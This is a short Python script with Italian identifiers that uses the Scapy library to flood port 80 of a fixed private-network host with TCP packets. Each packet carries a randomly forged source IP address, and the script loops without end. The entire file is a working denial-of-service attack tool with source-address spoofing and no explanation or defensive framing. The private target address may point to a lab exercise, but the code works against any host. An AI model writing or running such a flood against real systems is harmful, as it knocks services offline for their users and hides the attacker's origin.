from scapy.all import *
import random

ip_target = "192.168.43.71"

count = 1

while True:
    primo_blocco_tcp = str(random.randint(1, 254))
    secondo_blocco_tcp = str(random.randint(1, 254))
    terzo_blocco_tcp = str(random.randint(1, 254))
    quarto_blocco_tcp = str(random.randint(1, 254))

    punto = '.'
    ip_src = (primo_blocco_tcp + punto + 
              secondo_blocco_tcp + punto + 
              terzo_blocco_tcp + punto + 
              quarto_blocco_tcp)

    for srcport in range(1, 10):
        IP1 = IP(src=ip_src, dst=ip_target)
        TCP1 = TCP(sport=srcport, dport=80)
        globalLayer = IP1/TCP1
        send(globalLayer, inter=.0001)
        print(f'pacchetto inviato: {count}')
        count = count + 1